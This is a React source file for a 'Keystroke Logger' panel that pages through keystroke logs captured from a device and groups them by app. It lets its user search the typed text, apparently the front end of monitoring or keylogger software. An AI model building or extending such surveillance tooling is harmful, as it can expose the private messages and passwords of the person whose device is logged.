import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { useAuthContext } from '../context/AuthContext';
import dataService from '../services/dataService';
import { Keyboard, Clock, ChevronDown, Filter, Search, X } from 'lucide-react';

const PAGE_SIZE = 100;

function KeylogList({ deviceId }) {
  const { token } = useAuthContext();
  const [keylogs, setKeylogs] = useState([]);
  const [hasMore, setHasMore] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [selectedApp, setSelectedApp] = useState('All');
  const [searchQuery, setSearchQuery] = useState('');

  const formatTime = (timestamp) => {
    const date = new Date(timestamp < 10000000000 ? timestamp * 1000 : timestamp);
    return date.toLocaleString();
  };

  const fetchKeylogs = useCallback(async (skip, append = false) => {
    if (!token || !deviceId) return;
    setIsLoading(true);
    try {
      const res = await dataService.getKeylogs(token, skip, PAGE_SIZE, deviceId);
      if (res.data.length < PAGE_SIZE) setHasMore(false);
      setKeylogs(prev => append ? [...prev, ...res.data] : res.data);
    } catch (error) {
      console.error('Error loading keylogs:', error);
    } finally {
      setIsLoading(false);
      setInitialLoading(false);
    }
  }, [token, deviceId]);

  useEffect(() => {
    if (deviceId && token) {
      setKeylogs([]);
      setHasMore(true);
      setInitialLoading(true);
      setSelectedApp('All');
      setSearchQuery('');
      fetchKeylogs(0, false);
    }
  }, [deviceId, token, fetchKeylogs]);

  const loadMore = () => fetchKeylogs(keylogs.length, true);

  const consolidateKeylogs = (logs) => {
    if (!logs || logs.length === 0) return [];
    const sorted = [...logs].sort((a, b) => a.timestamp - b.timestamp);
    const sessions = [];
    for (const log of sorted) {
      const lastSession = sessions[sessions.length - 1];
      if (lastSession) {
        const lastEntry = lastSession[lastSession.length - 1];
        const timeDiff = log.timestamp - lastEntry.timestamp;
        if (lastEntry.package_name === log.package_name && timeDiff <= 3000) {
          lastSession.push(log);
          continue;
        }
      }
      sessions.push([log]);
    }
    return sessions.map(session =>
      session.reduce((longest, curr) =>
        curr.typed_text.length >= longest.typed_text.length ? curr : longest
      )
    );
  };

  const consolidatedKeylogs = useMemo(() => consolidateKeylogs(keylogs), [keylogs]);

  const uniqueApps = ['All', ...new Set(consolidatedKeylogs.map(k => k.package_name).filter(Boolean))];

  let filteredKeylogs = selectedApp === 'All'
    ? consolidatedKeylogs
    : consolidatedKeylogs.filter(k => k.package_name === selectedApp);

  if (searchQuery.trim()) {
    const q = searchQuery.toLowerCase().trim();
    filteredKeylogs = filteredKeylogs.filter(k =>
      (k.app_name || '').toLowerCase().includes(q) ||
      (k.package_name || '').toLowerCase().includes(q) ||
      (k.typed_text || '').toLowerCase().includes(q)
    );
  }

  return (
    <div className="bg-white rounded-3xl shadow-sm border border-slate-200 overflow-hidden animate-in fade-in duration-500">
      <div className="p-8 border-b border-slate-100 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div className="flex items-center gap-4">
          <div className="p-3 bg-indigo-50 rounded-2xl text-indigo-600">
            <Keyboard className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-xl font-bold text-slate-900">Keystroke Logger</h3>
            <p className="text-sm text-slate-500 mt-1 font-medium">Live captured text inputs across all applications</p>
          </div>
        </div>
        {!initialLoading && keylogs.length > 0 && (
          <div className="flex items-center gap-3 flex-wrap">
            <div className="flex items-center gap-2">
              <Search className="w-4 h-4 text-slate-400" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search keywords..."
                className="px-4 py-2 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-700 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent w-48"
              />
              {searchQuery && (
                <button
                  onClick={() => setSearchQuery('')}
                  className="p-1.5 text-slate-400 hover:text-slate-600 hover:bg-slate-100 rounded-lg transition-colors"
                >
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>
            <div className="flex items-center gap-2">
              <Filter className="w-4 h-4 text-slate-400" />
              <select
                value={selectedApp}
                onChange={(e) => setSelectedApp(e.target.value)}
                className="px-4 py-2 bg-slate-50 border border-slate-200 rounded-xl text-sm font-bold text-slate-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
              >
                {uniqueApps.map(app => (
                  <option key={app} value={app}>{app === 'All' ? 'All Apps' : app}</option>
                ))}
              </select>
            </div>
          </div>
        )}
      </div>

      {initialLoading ? (
        <div className="flex justify-center py-16">
          <div className="w-10 h-10 border-4 border-indigo-200 border-t-indigo-600 rounded-full animate-spin"></div>
        </div>
      ) : filteredKeylogs.length === 0 ? (
        <div className="p-20 text-center text-slate-400">
          <Keyboard className="w-12 h-12 mx-auto mb-4 opacity-20" />
          <p className="font-bold tracking-widest text-xs uppercase">
            {searchQuery.trim()
              ? 'No keystrokes match your search'
              : selectedApp === 'All'
                ? 'No keystrokes recorded yet'
                : 'No keystrokes for this app'}
          </p>
        </div>
      ) : (
        <div className="divide-y divide-slate-50 max-h-[600px] overflow-y-auto">
          {filteredKeylogs.map((log) => {
            return (
              <div key={log.id} className="p-6 hover:bg-slate-50 transition-colors group">
                <div className="flex items-start">
                  <div className="w-10 h-10 flex-shrink-0 rounded-xl bg-gradient-to-br from-indigo-100 to-purple-100 text-indigo-600 flex items-center justify-center font-bold text-lg shadow-sm">
                    {log.app_name ? log.app_name[0].toUpperCase() : 'K'}
                  </div>
                  <div className="ml-4 flex-1">
                    <div className="flex justify-between items-start">
                      <h4 className="text-sm font-black text-slate-900">{log.app_name || log.package_name}</h4>
                      <span className="text-[10px] font-bold text-slate-400 flex items-center uppercase tracking-widest">
                        <Clock className="w-3 h-3 mr-1" />
                        {formatTime(log.timestamp)}
                      </span>
                    </div>
                    <p className="text-xs font-bold text-slate-400 mt-0.5">{log.package_name}</p>
                    <div className="mt-2 p-3 bg-slate-50 rounded-xl border border-slate-100 text-sm text-slate-800 font-mono break-all">
                      {log.typed_text}
                    </div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {hasMore && !initialLoading && keylogs.length > 0 && (
        <div className="flex justify-center py-6 border-t border-slate-50">
          <button
            onClick={loadMore}
            disabled={isLoading}
            className="px-10 py-3 bg-white hover:bg-slate-50 text-slate-900 rounded-3xl text-xs font-black uppercase tracking-[0.2em] transition-all flex items-center border border-slate-200 shadow-sm"
          >
            {isLoading ? (
              <>
                <div className="w-4 h-4 border-2 border-slate-400 border-t-slate-900 rounded-full animate-spin mr-3"></div>
                Loading...
              </>
            ) : (
              <>
                <ChevronDown className="w-4 h-4 mr-2" />
                Load More Keylogs
              </>
            )}
          </button>
        </div>
      )}
    </div>
  );
}

export default KeylogList;
